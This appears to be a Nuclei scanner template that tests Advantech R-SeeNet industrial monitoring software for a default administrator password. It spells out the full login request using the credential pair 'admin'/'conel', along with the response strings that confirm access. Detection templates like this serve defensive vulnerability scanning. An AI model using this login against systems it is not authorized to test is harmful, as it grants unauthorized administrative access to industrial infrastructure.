id: advantech-r-seenet-default-password
info:
  name: Advantech R-SeeNet Default Password Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    Advantech R-SeeNet is an industrial monitoring software. This template checks
    for a default password vulnerability that allows unauthorized access to
    administrative functionalities.
  tags: default-password
http:
  - raw:
      - |
        POST /index.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded
        Referer: {{BaseURL}}
        Origin: {{BaseURL}}

        page=login_change&oper=0&username=admin&password=conel&submit=Login
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "R-SeeNet"
          - "User is succesfully logged"
        part: body
